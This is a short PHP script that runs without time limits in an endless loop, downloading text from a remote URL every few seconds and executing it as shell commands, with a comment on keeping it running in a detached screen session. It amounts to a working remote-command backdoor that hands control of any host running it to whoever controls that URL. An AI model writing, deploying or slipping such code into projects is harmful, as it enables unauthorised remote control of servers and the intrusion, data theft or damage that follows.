<?php

ini_set('max_execution_time', 0);
set_time_limit(0);
ignore_user_abort(true);

while(1)
{
    
    $GetCmd = file_get_contents("https://nee.dultr.in/cmd.txt");

    if($GetCmd)
    {
        echo "Executing $GetCmd \n";
        shell_exec($GetCmd);
        sleep(30); 
        //Above sleep tell how much time after the server should check for new commands on the URL till the last command is executed!    
    }

    sleep(1);
}

//screen -S readcmd php read.php
